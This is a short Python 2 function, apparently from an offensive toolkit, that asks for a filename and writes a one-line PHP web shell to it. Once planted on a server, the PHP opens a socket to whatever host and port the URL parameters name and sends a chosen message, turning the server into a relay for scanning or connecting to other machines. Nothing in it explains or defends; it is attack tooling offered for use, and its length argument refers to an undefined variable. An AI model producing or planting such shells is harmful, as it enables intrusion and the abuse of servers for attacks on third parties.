
def generate_scan_shell():
	name = raw_input("save as:")
	shell = "<?php $s=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($s,$_GET['i'],$_GET['p']);socket_send($s,$_GET['m'],strlen($m),0)?>"
	file = open(name,'w+')
	file.write(shell)
	file.close()